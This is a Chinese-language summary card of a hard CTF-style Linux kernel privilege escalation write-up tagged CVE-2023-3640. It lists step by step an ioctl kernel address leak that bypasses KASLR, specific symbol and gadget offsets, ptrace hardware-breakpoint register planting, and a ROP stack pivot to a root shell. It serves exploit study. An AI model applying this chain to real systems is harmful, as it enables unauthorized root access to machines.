---
title: "基于cpu_entry_area利用的Linux内核权限提升"
category: pwn
tags: ["CVE-2023-3640 内核提权", "pwn", "Linux内核提权", "cpu_entry_area", "KASLR绕过", "内核栈迁移"]
signals: ["CVE-2023-3640 内核提权 2024", "Linux内核提权", "cpu_entry_area", "KASLR绕过", "内核栈迁移", "硬件断点", "ROP", "ioctl 0x5555/0x6666", "ptrace", "heap_exploit", "CVE-2023-3640", "ioctl", "x5555", "x6666"]
difficulty: hard
source: "https://www.ctfiot.com/174565.html"
tools: ["ROP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 基于cpu_entry_area利用的Linux内核权限提升

> 赛事：CVE-2023-3640 内核提权 2024 | 方向：pwn | 难度：hard | 工具：ROP

## 一句话总结

CVE-2023-3640 cpu_entry_area 内核提权: ioctl 泄基址 + ptrace 硬件断点抓寄存器 + 寄存器填 ROP 提权。

## 攻击链

1. 漏洞: ioctl 0x5555 泄内核地址 / ioctl 0x6666 改内核栈迁移
2. cpu_entry_area 概要: 泄露内容得内核 text 段地址 → 偏移得内核基址, 绕 KASLR
3. 步骤 1: ioctl(fd, 0x5555, 0xfffffe0000000000+4) 泄地址 addr
4. 步骤 2: kernel_base = addr - 0x1008e00
5. 步骤 3: 算 init_cred/commit_cred/pop_rdi/swapgs 偏移
6. init_cred = kernel_base + 0xbd64cbf8 - 0xbbc00000
7. commit_cred = kernel_base + 0xbbcbb5b0 - 0xbbc00000
8. pop_rdi = kernel_base + 0x81002c9d - 0x81000000
9. swapgs_restore_regs_and_return_to_usermode = kernel_base + 0x82000f01 - 0x81000000
10. 步骤 4: 父进程 fork 子进程 + PTRACE_TRACEME + SIGSTOP
11. 步骤 5: PTRACE_POKEUSER 设 dr0 = mmap(0x0a000000) 硬件断点
12. 步骤 6: PTRACE_POKEUSER 设 dr7 = 0xf0101 (本地写断点+启用)
13. 步骤 7: PTRACE_CONT 触发断点, CPU 寄存器写到 mmap 区域
14. 步骤 8: 寄存器填 r13=init_cred, r12=commit_cred, rbp=swapgs, r10=getshell
15. 步骤 9: 子进程 mov rdi, [rsi] 触发硬件断点, 走 ROP → getRootShell
16. 步骤 10: ioctl(fd, 0x6666, 0xfffffe0000010f60) 改内核栈迁移地址

## 关键 payload

```
ioctl 0x5555 泄 + 0x6666 栈迁移 + ptrace dr0+dr7 硬件断点 + 寄存器填 ROP
```

## 经验教训

cpu_entry_area 是 Linux 内核 KASLR 旁路经典, 泄露内容得内核 text 段偏移; ptrace dr0/dr7 硬件断点 + PTRACE_CONT 抓寄存器值; 寄存器填 ROP 走 commit_creds(init_cred) + swapgs 返用户态。

## 标签

Linux内核提权、cpu_entry_area、KASLR绕过、内核栈迁移、硬件断点、ROP、ioctl 0x5555/0x6666、ptrace、CVE-2023-3640

## 参考来源

- https://www.ctfiot.com/174565.html
- 原文件：基于cpu_entry_area利用的Linux内核权限提升.full.md
